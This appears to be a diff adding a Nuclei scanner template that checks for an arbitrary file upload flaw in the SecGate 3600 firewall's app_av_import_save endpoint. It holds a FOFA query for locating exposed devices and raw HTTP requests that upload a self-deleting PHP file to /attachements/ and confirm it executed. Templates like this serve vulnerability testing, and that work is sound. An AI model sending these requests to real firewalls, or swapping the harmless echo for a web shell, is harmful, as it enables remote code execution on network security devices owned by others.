@@ -1,0 +1,50 @@
+id: ws-fw-app_av_import_save-fileupload
+
+info:
+  name: ws-fw-app_av_import_save-fileupload
+  author: yy
+  severity: high
+  description: 网神防火墙app_av_import_save存在文件上传漏洞。
+  tags: ws,fileupload
+  metadata:
+    fofa-qeury: title="网神SecGate 3600防火墙"
+    veified: true
+    max-request: 2
+
+http:
+  - raw:
+      - |              
+        POST / HTTP/1.1
+        Host: 
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        10000000
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="reqfile";filename="{{filename}}"
+        Content-Type: text/plain
+
+        <?php echo(md5(1235));unlink(__FILE__);?>
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="submit_post"
+
+        app_av_import_save
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+
+      - |              
+        GET /attachements/{{filename}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15      
+
+    payloads:
+      filename:
+        - "qwqer21.php"
+               
+    matchers:     
+      - type: dsl
+        name: filename
+        dsl:
+          - "status_code_2 == 200 && contains(body,'9996535e07258a7bbfd8b132435c5962') && contains(header,'text/html')" 
